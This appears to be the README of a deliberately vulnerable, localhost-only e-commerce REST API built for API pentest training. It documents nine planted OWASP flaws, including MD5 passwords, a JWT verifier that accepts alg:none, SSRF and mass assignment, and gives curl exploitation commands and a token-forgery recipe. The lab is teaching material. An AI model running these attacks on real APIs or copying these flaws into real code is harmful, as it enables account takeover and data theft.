# 04 - ShopAPI (API REST JSON vulnerável de propósito)

> ⚠️ **VULNERÁVEL DE PROPÓSITO — SOMENTE LOCALHOST.** Este serviço traz nove bugs
> reais do OWASP API Security Top 10. Nunca o exponha a uma rede. Ele escuta em
> `127.0.0.1:18804` de propósito.

O **ShopAPI** é uma API REST de comércio eletrônico falsa, usada como alvo de
treino de pentest de API. É um arquivo Python único, só com a biblioteca padrão
(`http.server` + `sqlite3` + `hmac`/`hashlib`/`base64` + `json`). Não há
**nenhuma dependência externa** e os JWTs são montados e verificados **na mão**
(sem PyJWT). Os dados ficam num banco SQLite em memória, populado do zero.

## Rodar

```bash
python app.py
# -> ShopAPI (lab de API vulnerável) em http://127.0.0.1:18804
```

Todas as respostas são JSON (`Content-Type: application/json`). O servidor é
multithread, nunca trava e reaproveita o endereço. `GET /` ou `GET /api/v1/`
devolve um índice descobrível de todos os endpoints.

## Modelo de autenticação

- `POST /api/v1/login` com `{"username","password"}` devolve `{"token": "<jwt>"}`.
- Endpoints protegidos leem `Authorization: Bearer <jwt>`.
- Os tokens carregam `{"sub": <username>, "role": <role>}`.
- O verificador de JWT é **quebrado de propósito** (veja B8): aceita tokens não
  assinados `alg:none`, verifica `HS256` contra o segredo fraco `apisecret` e
  nunca confere a validade.

## Usuários de semente

As senhas são armazenadas como **MD5** (fraco por projeto). O texto plano é
mostrado aqui só porque isto é um laboratório.

| id | username | password (plano) | md5(password)                      | role  | email               | ssn         |
|----|----------|------------------|------------------------------------|-------|---------------------|-------------|
| 1  | admin    | `admin123`       | `0192023a7bbd73250516f069df18b500` | admin | admin@shopapi.test  | 111-22-3333 |
| 2  | alice    | `alicepass`      | `7c90f2dc82aa5dd4501132f6d074a53a` | user  | alice@example.com   | 222-33-4444 |
| 3  | bob      | `bobsecret`      | `de3d9451c238b5949ad3597a6a682628` | user  | bob@example.com     | 333-44-5555 |
| 4  | carol    | `carol2024`      | `8c3f57612a56df09ee89dfef094c6aef` | user  | carol@example.com   | 444-55-6666 |

`admin/admin123` é a conta de administrador. O MD5 é usado de propósito (hash fraco).

Pedidos (tabela `orders`: `id, user_id, item, total`):

| id   | user_id | item                  | total   |
|------|---------|-----------------------|---------|
| 1001 | 1 (admin) | Datacenter rack unit | 4999.00 |
| 1002 | 2 (alice) | Wireless headphones  | 129.99  |
| 1003 | 2 (alice) | USB-C charger        | 24.50   |
| 1004 | 3 (bob)   | Mechanical keyboard  | 109.00  |
| 1005 | 4 (carol) | 4K monitor           | 349.99  |

## Vulnerabilidades plantadas (B1..B9)

| ID  | Categoria OWASP API                               | Rota                           | Como explorar |
|-----|---------------------------------------------------|--------------------------------|----------------|
| B1  | API1:2023 Broken Object Level Auth (BOLA)         | `GET /api/v1/orders/<id>`      | Entre como `alice`; peça `orders/1001` (pedido do admin) ou `orders/1004` (do bob). O token é válido mas a propriedade nunca é verificada → qualquer id de pedido vaza. |
| B2  | API1:2023 BOLA (PII)                               | `GET /api/v1/users/<id>`       | Com qualquer token válido, peça `users/1`, `users/3`, … Sem verificação de propriedade → leia o registro completo de qualquer usuário (email, endereço, ssn, internal_notes). |
| B3  | API5:2023 Broken Function Level Auth (BFLA)        | `POST /api/v1/admin/promote`   | Com token de **usuário comum**, `POST {"username":"alice","role":"admin"}`. A função "admin" nunca verifica o papel de quem chama → autopromoção. |
| B4  | API3:2023 Broken Object Property Level / Mass Assign | `PATCH /api/v1/me`          | Como `alice`, `PATCH {"role":"admin"}` (ou `{"is_admin":true}`). Sem lista de permissão → campos arbitrários, inclusive `role`, são gravados no seu próprio registro. |
| B5  | API3:2023 Excessive Data Exposure                 | `GET /api/v1/users`            | Com qualquer token válido, liste usuários. A resposta inclui `password_hash` (md5), `ssn` e `internal_notes` — campos que um cliente nunca deveria receber. |
| B6  | API4:2023 Unrestricted Resource Consumption (sem limite de taxa) | `POST /api/v1/login` | Força bruta de credenciais: não há contador, atraso nem bloqueio. Martele o `login` com uma wordlist; toda tentativa é processada na hora. |
| B7  | API7:2023 Server Side Request Forgery (SSRF)      | `POST /api/v1/avatar`          | `POST {"url":"http://127.0.0.1:18804/api/v1/internal/config"}`. O servidor busca a URL sem validar o destino e reflete o corpo → vaza a configuração interna (DSN do banco, chave stripe, chaves aws, flag). |
| B8  | API2:2023 Broken Authentication (JWT)             | todas as rotas protegidas      | (a) Forje o cabeçalho `{"alg":"none"}` + payload `{"sub":"admin","role":"admin"}`, assinatura vazia → aceito por `GET /api/v1/me`. (b) O segredo HS256 é `apisecret` (adivinhável/força-brutável), então também dá para cunhar tokens assinados válidos. (c) O `exp` nunca é validado. |
| B9  | API8:2023 Security Misconfiguration (erro verboso)| `POST /api/v1/orders`         | `POST` de JSON malformado (por exemplo `{bad json`) ou `{"item": 123}` (não string). O traceback completo do Python é devolvido no corpo em vez de um erro genérico. |

### O alvo do SSRF

`GET /api/v1/internal/config` devolve segredos internos falsos mas **recusa
chamadores fora do loopback** (devolve 403 a menos que a requisição venha de
`127.0.0.1` / `::1`). É alcançável pelo SSRF em `POST /api/v1/avatar` (B7), que o
busca *a partir do próprio servidor*.

## Início rápido (cola de exploração)

```bash
BASE=http://127.0.0.1:18804

# pega um token de usuário comum
TOK=$(curl -s $BASE/api/v1/login -d '{"username":"alice","password":"alicepass"}' \
      | python -c "import sys,json;print(json.load(sys.stdin)['token'])")

# B1: pedido de outro usuário
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders/1001

# B5: exposição excessiva de dados
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/users

# B3: autopromoção pela função admin
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/admin/promote \
     -d '{"username":"alice","role":"admin"}'

# B4: atribuição em massa
curl -s -X PATCH -H "Authorization: Bearer $TOK" $BASE/api/v1/me \
     -d '{"role":"admin"}'

# B7: SSRF para a config interna
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/avatar \
     -d '{"url":"http://127.0.0.1:18804/api/v1/internal/config"}'

# B9: traceback
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders -d '{bad json'
```

Para uma forja `alg:none` (B8), codifique em base64url `{"alg":"none","typ":"JWT"}`
e `{"sub":"admin","role":"admin"}`, junte com um ponto ao final e envie como token
Bearer — sem assinatura.

Veja `gabarito.json` para o gabarito legível por máquina.
